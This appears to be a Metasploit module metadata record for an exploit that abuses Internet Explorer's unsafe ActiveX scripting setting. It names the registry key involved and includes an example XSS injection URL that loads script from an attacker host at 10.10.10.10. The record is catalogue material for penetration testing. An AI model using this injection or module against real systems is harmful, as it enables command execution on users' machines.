{
  "name": "Microsoft Internet Explorer Unsafe Scripting Misconfiguration",
  "fullname": "exploit/windows/browser/ie_unsafe_scripting",
  "disclosure_date": "2010-09-20T00:00:00Z",
  "type": "exploit",
  "author": [
    "natron \u003cnatron@metasploit.com\u003e",
    "Ben Campbell \u003ceat_meatballs@hotmail.co.uk\u003e"
  ],
  "description": "This exploit takes advantage of the \"Initialize and script ActiveX controls not\n      marked safe for scripting\" setting within Internet Explorer.  When this option is set,\n      IE allows access to the WScript.Shell ActiveX control, which allows javascript to\n      interact with the file system and run commands.  This security flaw is not uncommon\n      in corporate environments for the 'Intranet' or 'Trusted Site' zones.\n\n        When set via domain policy, the most common registry entry to modify is HKLM\\\n      Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1\\1201,\n      which if set to '0' forces ActiveX controls not marked safe for scripting to be\n      enabled for the Intranet zone.\n\n        This module creates a javascript/html hybrid that will render correctly either\n      via a direct GET http://msf-server/ or as a javascript include, such as in:\n      http://intranet-server/xss.asp?id=\"\u003e\u003cscript%20src=http://10.10.10.10/ie_unsafe_script.js\u003e\n      \u003c/script\u003e.\n\n        IE Tabs, WScript and subsequent Powershell prompts all run as x86 even when run from\n      an x64 iexplore.exe.\n\n        By default, this module will not attempt to fire against IEs that come with Protected\n      Mode enabled by default, because it can trigger a security prompt. However, if you are\n      feeling brave, you can choose to ignore this restriction by setting the ALLOWPROMPT\n      datastore option to true.",
  "references": [
    "URL-http://support.microsoft.com/kb/182569",
    "URL-http://blog.invisibledenizen.org/2009/01/ieunsafescripting-metasploit-module.html",
    "URL-http://support.microsoft.com/kb/870669"
  ],
  "platform": "Windows",
  "arch": "x86",
  "targets": [
    "Windows x86/x64"
  ],
  "mod_time": "2021-01-13T11:06:01Z",
  "path": "/modules/exploits/windows/browser/ie_unsafe_scripting.rb",
  "is_install_path": true,
  "ref_name": "windows/browser/ie_unsafe_scripting"
}
